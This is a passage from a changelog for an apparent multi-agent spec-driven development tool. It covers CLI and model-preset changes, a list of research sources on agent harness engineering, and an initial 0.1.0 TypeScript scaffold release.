  no-`--yes` refuses to guess and asks for an explicit list.
- **README and Makefile smoke** — examples now exercise `--all` /
  multi-vendor paths instead of `--agent=claude`.
- **AllAgents()** returns agent IDs in alphabetical order.
- The 10 model presets span 5 vendors (Anthropic, OpenAI, Google,
  DeepSeek, Xiaomi) with no vendor privileged; adding a vendor is a
  single edit to `PresetModels`.

### Research (14 videos analyzed)
- Valdemar Neto (Tech Leads Club): RPI framework, context engineering,
  harness engineering
- Harness Engineering: OpenAI, Anthropic, Martin Fowler blog posts
- AGENTS.md effectiveness study (University of Zurich)
- Spec Driven frameworks benchmark ($2000 in tokens)
- Navigation Paradox paper (2026)
- Architecture criticism: clean architecture vs pragmatic simplicity

## [0.1.0] — 2026-06-24 (TypeScript — archived)

### Added
- Initial TypeScript scaffold for SDD pipeline
- 15 skills (7 complete, 8 stubs)
- 6 agent adapters
- Quality scripts (audit, mermaid, eval)
- 110 tests
- Golden example (Pulse)
